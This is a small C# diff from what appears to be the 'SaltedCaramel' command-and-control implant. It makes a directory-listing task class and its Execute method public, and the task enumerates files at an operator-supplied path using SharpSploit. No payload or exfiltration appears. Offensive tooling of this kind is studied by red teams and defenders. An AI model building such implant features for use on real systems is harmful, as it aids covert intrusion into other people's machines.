@@ -8,9 +8,9 @@ using System.IO;
 
 namespace SaltedCaramel.Tasks
 {
-    class DirectoryList
+    public class DirectoryList
     {
-        internal static void Execute(SCTaskObject task, SCImplant implant)
+        public static void Execute(SCTaskObject task, SCImplant implant)
         {
             string path = task.@params;
             SharpSploitResultList<Host.FileSystemEntryResult> list;
